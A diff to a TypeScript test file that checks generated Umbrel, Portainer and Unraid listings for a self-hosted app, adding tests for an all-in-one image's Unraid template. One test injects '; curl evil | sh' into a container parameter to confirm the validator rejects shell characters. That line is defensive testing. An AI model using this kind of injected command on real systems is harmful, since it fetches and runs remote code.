@@ -25,8 +25,8 @@ interface Sources {
   metaFile: string;
   meta: Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
   compose: Record<string, any>; // eslint-disable-line @typescript-eslint/no-explicit-any
-  images: { app: string; postgres: string; updater: string };
-  channels: { app: { stable: string; next: string }; postgres: { stable: string; next: string } };
+  images: { app: string; postgres: string; updater: string; aio: string };
+  channels: { app: { stable: string; next: string }; postgres: { stable: string; next: string }; aio: { stable: string | null; next: string } };
 }
 interface SourcesModule {
   REPO_ROOT: string;
@@ -34,7 +34,7 @@ interface SourcesModule {
   metadataProblems(m: unknown, file?: string): string[];
   profileProblems(meta: unknown, compose: unknown, file?: string): string[];
   isReverseDomain(s: unknown): boolean;
-  imageNamesFromWorkflow(text: string, owner: string): { app: string; postgres: string; updater: string };
+  imageNamesFromWorkflow(text: string, owner: string): { app: string; postgres: string; updater: string; aio: string };
   yaml: { load(s: string): any; dump(v: unknown, o?: object): string }; // eslint-disable-line @typescript-eslint/no-explicit-any
 }
 interface BuildModule {
@@ -93,6 +93,9 @@ test.describe("the committed listings", () => {
       `umbrel/${meta.slug}/docker-compose.yml`,
       "portainer/templates.json",
       "portainer/compose.yml",
+      `unraid/templates/${meta.slug}.xml`,
+      "unraid/ca_profile.xml",
+      "unraid/README.md",
     ]) expect(paths, want).toContain(want);
   });
 
@@ -285,8 +288,11 @@ test.describe("automatic updates: the updater only in Portainer, the socket only
   test("each template's switch is COMPOSE_PROFILES, off by default, with the metadata's texts", async () => {
     const { src, files } = await generated();
     const t = JSON.parse(files["portainer/templates.json"]);
-    expect(t.templates).toHaveLength(2);
-    for (const tpl of t.templates) {
+    // The two stack templates; the third is the all-in-one image's single container, with no profiles.
+    const stacks = t.templates.filter((x: { type: number }) => x.type === 3);
+    expect(stacks).toHaveLength(2);
+    expect(t.templates.filter((x: { type: number }) => x.type === 1)).toHaveLength(1);
+    for (const tpl of stacks) {
       const f = tpl.env.find((e: { name: string }) => e.name === "COMPOSE_PROFILES");
       expect(f, `template ${tpl.id}`).toEqual({
         name: "COMPOSE_PROFILES",
@@ -556,5 +562,110 @@ test.describe("one source", () => {
     });
     expect(() => releaseTags({ tag: "1.18.0", major: "17" })).toThrow(/not a release tag/);
     expect(() => releaseTags({ sha: "2e83c9f", major: "17" })).toThrow(/needs --version/);
+  });
+});
+
+test.describe("the Unraid template for the all-in-one image (RFC-024 §5.1, phase 5)", () => {
+  const tpl = (slug: string) => `unraid/templates/${slug}.xml`;
+
+  test("CA's format: <Container version=\"2\">, the image on docker.yml's channel, Beta while there is no stable one", async () => {
+    const { src, files } = await generated();
+    const xml = files[tpl(src.meta.slug)];
+    expect(xml.startsWith('<?xml version="1.0"?>')).toBe(true);
+    expect(xml).toContain('<Container version="2">');
+    const tag = src.channels.aio.stable ?? src.channels.aio.next;
+    expect(xml).toContain(`<Repository>${src.images.aio}:${tag}</Repository>`);
+    expect(src.channels.aio.stable, "no stable all-in-one channel before phase 5's gates").toBeNull();
+    expect(xml).toContain("<Beta>true</Beta>");
+    expect(xml).toContain(`<WebUI>http://[IP]:[PORT:${src.meta.ports.web.container}]/</WebUI>`);
+    expect(xml).toMatch(/<ExtraParams>--stop-timeout=60<\/ExtraParams>/);
+    expect(xml).toMatch(/<Config [^>]*Target="\/data" Default="\/mnt\/user\/appdata\/[a-z-]+" Mode="rw"[^>]*Type="Path"/);
+    expect(xml).toMatch(/<Config [^>]*Target="PUID" Default="99"/);
+    expect(xml).toMatch(/<Config [^>]*Target="PGID" Default="100"/);
+    expect(xml).not.toContain("WEBRTC_LAN_IP");
+    expect(files["unraid/ca_profile.xml"]).toMatch(/<CommunityApplications>\s*\n\s*<Profile>[^<]+<\/Profile>/);
+  });
+
+  test("red: each of CA's rules the checks hold, broken on purpose", async () => {
+    const { src, files } = await generated();
+    const { listingProblems } = await checksMod;
+    const path = tpl(src.meta.slug);
+    const with_ = (from: string | RegExp, to: string) => {
+      const changed = files[path].replace(from, to);
+      expect(changed, String(from)).not.toBe(files[path]);
+      return listingProblems({ ...files, [path]: changed }, src);
+    };
+    expect(with_("</Container>", "</Contain>").join()).toContain("not well-formed XML");
+    expect(with_("  <Beta>true</Beta>\n", "")).toContain("unraid: no stable all-in-one channel yet, so <Beta>true</Beta> is required");
+    expect(with_(/\[PORT:\d+\]/, "[PORT:3001]").join()).toContain("WebUI must be http://[IP]:[PORT:3000]");
+    expect(with_("--stop-timeout=60", "--stop-timeout=10").join()).toContain("ExtraParams must set --stop-timeout");
+    expect(with_("--stop-timeout=60", "--stop-timeout=60; curl evil | sh").join()).toContain("shell character");
+    expect(with_(`${src.images.aio}:`, `${src.images.app}:`).join()).toContain("not docker.yml's all-in-one image");
+    expect(with_(/ Mask="false"/, "").join()).toMatch(/Config Web UI lacks Mask/);
+    expect(with_(/Display="always"/, 'Display="sometimes"').join()).toContain('Display="sometimes" is not one of');
+    expect(with_(/Target="PUID" Default="99"/, 'Target="PUID" Default="1000"').join()).toContain("PUID/PGID must default to Unraid's 99:100");
+    expect(with_(/<TemplateURL>[^<]+</, "<TemplateURL>https://example.com/t.xml<").join()).toContain("TemplateURL is not the template repository's raw URL");
+    expect(with_(/<Overview>/, "<Overview>Shortened. ").join()).toBe("");
+    expect(with_(/go2rtc is not included/, "go2rtc is included").join()).toContain("lacks the all-in-one note");
+    expect(listingProblems({ ...files, "unraid/ca_profile.xml": files["unraid/ca_profile.xml"].replace(/<Profile>[^<]+<\/Profile>/, "<Profile> </Profile>") }, src))
+      .toContain("unraid: ca_profile.xml has no Profile (CA requires a non-empty one)");
+    const pt = JSON.parse(files["portainer/templates.json"]);
+    pt.templates.find((t: { type: number }) => t.type === 1).image = `${src.images.app}:next`;
+    expect(listingProblems({ ...files, "portainer/templates.json": JSON.stringify(pt) }, src).join()).toContain("portainer: runs");
+  });
+
+  test("the channel comes from docker.yml: once AIO_IMAGE_TAGS publishes `latest`, the template follows, with `next` as a Branch", async () => {
+    const root = inputsCopy();
+    try {
+      const { loadSources } = await sourcesMod;
+      const { buildListings } = await buildMod;
+      const { listingProblems } = await checksMod;
+      const wf = join(root, ".github/workflows/docker.yml");
+      const text = readFileSync(wf, "utf8");
+      const stable = "    type=raw,value=latest,enable=${{ startsWith(github.ref, 'refs/tags/v') && !contains(github.ref, '-') }}\n";
+      const at = text.indexOf("  AIO_IMAGE_TAGS: |\n") + "  AIO_IMAGE_TAGS: |\n".length;
+      writeFileSync(wf, text.slice(0, at) + stable + text.slice(at));
+      const src = loadSources(root);
+      expect(src.channels.aio).toEqual({ stable: "latest", next: "next" });
+      const files = buildListings(src);
+      const xml = files[tpl(src.meta.slug)];
+      expect(xml).toContain(`<Repository>${src.images.aio}:latest</Repository>`);
+      expect(xml).not.toContain("<Beta>");
+      expect(xml).toMatch(/<Branch>\s*<Tag>next<\/Tag>/);
+      expect(listingProblems(files, src)).toEqual([]);
+      // and the committed template, still on `next`, now fails the checks.
+      const { filesOnDisk } = await buildMod;
+      expect(listingProblems(filesOnDisk(REPO), src).join()).toContain("docker.yml's stable channel is latest");
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+
+  test("the CA category check is linear and still strict", async () => {
+    const { metadataProblems, loadSources } = await sourcesMod;
+    const meta = structuredClone(loadSources(REPO).meta);
+    const bad = (category: string) => { meta.aio.unraid.category = category; return metadataProblems(meta).join(); };
+    expect(bad("HomeAutomation: Productivity:")).toBe("");
+    expect(bad("HomeAutomation Productivity")).toContain("aio.unraid.category");
+    expect(bad("Home:Automation: x")).toContain("aio.unraid.category");
+    // CodeQL's input: "A:" then many "AA:", ending in a non-match. Instant, not exponential.
+    const t0 = Date.now();
+    expect(bad(`A:${"AA:".repeat(5000)}!`)).toContain("aio.unraid.category");
+    expect(Date.now() - t0).toBeLessThan(200);
+  });
+
+  test("the image name comes from docker.yml: renamed there, the template follows", async () => {
+    const root = inputsCopy();
+    try {
+      const { loadSources } = await sourcesMod;
+      const { buildListings } = await buildMod;
+      const wf = join(root, ".github/workflows/docker.yml");
+      writeFileSync(wf, readFileSync(wf, "utf8").replace(/^(\s+AIO_IMAGE_NAME: \$\{\{ github\.repository_owner \}\})\/[a-z-]+$/m, "$1/one-box"));
+      const src = loadSources(root);
+      expect(src.images.aio).toMatch(/\/one-box$/);
+      expect(buildListings(src)[tpl(src.meta.slug)]).toContain(`<Repository>${src.images.aio}:next</Repository>`);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
   });
 });
